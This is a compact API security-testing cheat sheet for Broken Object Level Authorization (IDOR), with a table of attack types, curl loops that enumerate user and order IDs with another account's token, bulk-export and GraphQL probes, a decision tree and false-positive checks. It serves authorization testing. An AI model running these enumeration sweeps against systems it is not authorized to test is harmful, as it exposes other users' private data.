# BOLA (Broken Object Level Authorization) — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Sequential ID** | Numeric ID in URL | `for i in {1..100}; do curl /api/order/$i -H "Bearer: B"; done` | B reads A's order | 403 all |
| **UUID IDOR** | UUID — NOT safe by itself | `curl /api/user/$UUID -H "Bearer: B"` | User A's data from B's token | 403 |
| **Email as ID** | email in param | `curl /api/profile?email=victim@x.com -H "Bearer: A"` | Victim profile returned | "not authorized" |
| **Base64 ID** | Encoded ID | `echo "USER_ID" | base64` then use in URL | Other user's data | Decoding changes nothing |
| **Bulk BOLA** | /export /all /batch | `curl /api/users/export -H "Bearer: USER"` | All users in response | Paginated to own data |
| **GraphQL BOLA** | Query with ID arg | `query{order(id:VICTIM_ID){total}}` | Other order details | Field-level auth |

## CURL
```bash
# Credential: User A + User B tokens
TOKEN_A="bearer_token_a"
TOKEN_B="bearer_token_b"

# Test BOLA: User A tries to access User B's orders
order_b=$(curl -s "/api/orders?limit=1" -H "Authorization: Bearer $TOKEN_B" | jq -r '.[0].id')
curl -s "/api/orders/$order_b" -H "Authorization: Bearer $TOKEN_A" | jq '{id, user_id, total}'
# If user_id != A's user_id → BOLA CONFIRMED

# Numeric ID sweep
for id in $(seq 1 200); do
  resp=$(curl -s -o /dev/null -w "%{http_code}" "/api/users/$id" -H "Bearer: $TOKEN_A")
  [ "$resp" = "200" ] && echo "User $id: ACCESSIBLE"
done

# Bulk export test
curl -s "/api/users/export?format=json" -H "Bearer: $TOKEN_A" | jq '. | length'
```

## DECISION TREE
```
Resource accessed by ID?
├─ Sequential? → Enumerate 1-1000
├─ UUID? → Try from other session (UUID ≠ auth!)
├─ Base64? → Decode, modify, re-encode, use
├─ Email? → Try other users' emails
└─ Bulk endpoint? → Try export with low-priv token
```

## FALSE POSITIVE KILLS
- 403 → auth present (move on)
- 200 with empty body → filter applied (check if data type matches)
- Same data both tokens → not IDOR (no user isolation at all = missing auth)
